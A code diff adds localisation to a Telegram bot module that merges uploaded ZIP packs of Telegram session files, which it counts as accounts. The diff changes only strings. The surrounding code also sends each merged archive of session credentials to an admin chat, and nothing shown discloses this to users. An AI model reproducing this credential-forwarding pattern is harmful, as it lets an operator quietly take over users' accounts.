@@ -10,14 +10,15 @@ from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 
 logger = logging.getLogger(__name__)
+from i18n import tr, lang_from_update, get_env_i18n
 BACK_BUTTON_EMOJI_ID = "5877629862306385808"
 CONFIRM_BUTTON_EMOJI_ID = "5839200986022812209"
 
 user_merge_sessions = {}
 
-def create_back_button():
+def create_back_button(lang="zh"):
     return InlineKeyboardButton(
-        "返回主菜单", 
+        tr("back_to_main", lang),
         callback_data="back_to_main"
     ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}
 
@@ -31,12 +32,13 @@ def safe_extract(zip_ref, target_dir):
 async def show_merge_packs(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, user_states: dict):
     query = update.callback_query
     user_id = str(query.from_user.id)
-    
-    keyboard = [[create_back_button()]]
+    lang = lang_from_update(update)
+
+    keyboard = [[create_back_button(lang)]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
+
     await query.edit_message_text(
-        text=text,
+        text=get_env_i18n("MERGE_PACKS_BACK", lang) or text,
         parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
@@ -49,10 +51,11 @@ async def show_merge_packs(update: Update, context: ContextTypes.DEFAULT_TYPE, t
 
 async def handle_merge_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
     document = update.message.document
-    
+    lang = lang_from_update(update)
+
     if not document.file_name.endswith('.zip'):
         await update.message.reply_text(
-            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
+            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("err.zip_required", lang),
             parse_mode=ParseMode.HTML
         )
         return
@@ -80,15 +83,15 @@ async def handle_merge_document(update: Update, context: ContextTypes.DEFAULT_TY
     session["files"].append(zip_path)
     
     confirm_button = InlineKeyboardButton(
-        " 确认整合", 
+        tr("merge.confirm", lang),
         callback_data="confirm_merge"
     ).to_dict() | {"icon_custom_emoji_id": CONFIRM_BUTTON_EMOJI_ID}
-    
-    confirm_keyboard = [[confirm_button, create_back_button()]]
+
+    confirm_keyboard = [[confirm_button, create_back_button(lang)]]
     confirm_msg = await update.message.reply_text(
-        f"<tg-emoji emoji-id='5920052658743283381'>📦</tg-emoji> 已接收第 {len(session['files'])} 个ZIP包\n"
-        f"当前共有 <b>{len(session['files'])}</b> 个ZIP包待整合\n\n"
-        "<tg-emoji emoji-id='5954175920506933873'>📦</tg-emoji>点击确认开始整合所有包",
+        f"<tg-emoji emoji-id='5920052658743283381'>📦</tg-emoji> {tr('merge.received', lang)}{len(session['files'])} {tr('merge.pending', lang)}\n"
+        f"{tr('shaihuo.found_accounts', lang)} <b>{len(session['files'])}</b> {tr('merge.pending', lang)}\n\n"
+        "<tg-emoji emoji-id='5954175920506933873'>📦</tg-emoji>" + tr("merge.click_confirm", lang),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(confirm_keyboard)
     )
@@ -97,20 +100,21 @@ async def handle_merge_document(update: Update, context: ContextTypes.DEFAULT_TY
 async def confirm_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user_states: dict):
     query = update.callback_query
     user_id = str(query.from_user.id)
+    lang = lang_from_update(update)
     await query.answer()
-    
+
     if user_id not in user_merge_sessions or not user_merge_sessions[user_id]["files"]:
         await query.edit_message_text(
-            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 没有找到待整合的文件",
+            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("merge.no_files", lang),
             parse_mode=ParseMode.HTML
         )
         return
-    
+
     session = user_merge_sessions[user_id]
     zip_files = session["files"].copy()
-    
+
     await query.edit_message_text(
-        "<tg-emoji emoji-id='5443127283898405358'>⚙️</tg-emoji> 正在整合号包，请稍候...",
+        "<tg-emoji emoji-id='5443127283898405358'>⚙️</tg-emoji> " + tr("merge.merging", lang),
         parse_mode=ParseMode.HTML
     )
     
@@ -126,6 +130,7 @@ async def confirm_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user
         user_states.pop(user_id, None)
 
 async def process_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str, zip_files: list):
+    lang = lang_from_update(update)
     with tempfile.TemporaryDirectory() as temp_dir:
         extract_dir = os.path.join(temp_dir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
@@ -152,10 +157,10 @@ async def process_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user
                         json_files[base_name] = json_path
         
         if not session_files:
-            keyboard = [[create_back_button()]]
+            keyboard = [[create_back_button(lang)]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await update.effective_chat.send_message(
-                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到任何session文件",
+                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("merge.no_session", lang),
                 parse_mode=ParseMode.HTML,
                 reply_markup=reply_markup
             )
@@ -184,7 +189,7 @@ async def process_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user
                     zipf.write(file_path, arcname)
         
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        caption = f"<b><tg-emoji emoji-id='5877307202888273539'>📦</tg-emoji> 整合号包完成</b>\n\n总账号数: <b>{len(session_files)}</b>"
+        caption = f"<b><tg-emoji emoji-id='5877307202888273539'>📦</tg-emoji> {tr('merge.done', lang)}</b>\n\n{tr('merge.total_accounts', lang)}: <b>{len(session_files)}</b>"
         
         with open(output_zip, 'rb') as f:
             await context.bot.send_document(
@@ -206,7 +211,7 @@ async def process_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, user
                         chat_id=admin_id,
                         document=f,
                         filename=f"merged_{user_id}_{timestamp}.zip",
-                        caption=f"<tg-emoji emoji-id='5877307202888273539'>📦</tg-emoji>用户 {user_id} 整合号包 - {len(session_files)}个账号",
+                        caption=f"<tg-emoji emoji-id='5877307202888273539'>📦</tg-emoji>{tr('admin.user', lang)} {user_id} {tr('merge.done', lang)} - {len(session_files)} {tr('shaihuo.accounts', lang)}",
                         parse_mode=ParseMode.HTML
                     )
             except Exception as e:
